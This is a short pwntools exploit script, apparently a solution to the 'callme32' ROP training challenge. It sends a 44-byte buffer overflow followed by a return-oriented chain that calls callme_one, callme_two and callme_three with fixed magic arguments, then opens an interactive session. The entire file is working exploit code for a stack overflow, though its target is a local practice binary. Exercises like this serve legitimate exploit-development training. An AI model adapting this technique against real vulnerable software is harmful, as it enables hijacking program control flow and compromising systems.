from pwn import *

r=process('./callme32')


r.recvuntil('> ')
#gdb.attach(r,"""break *0x0804874e
#        break *0x80484f0
#        break *0x8048550
#        break *0x80484e0""")
callme_one=0x80484f0
callme_two=0x8048550
callme_three=0x80484e0
payload="a"*44
payload+=p32(callme_one)+p32(0x080486ed)+p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)

r.sendline(payload)

r.recvuntil('> ')
payload='a'*44
payload+=p32(callme_two)+p32(0x080486ed)+p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)
r.sendline(payload)

r.recvuntil('> ')
payload='a'*44
payload+=p32(callme_three)+p32(0x080486ed)+p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)
r.sendline(payload)
r.interactive()
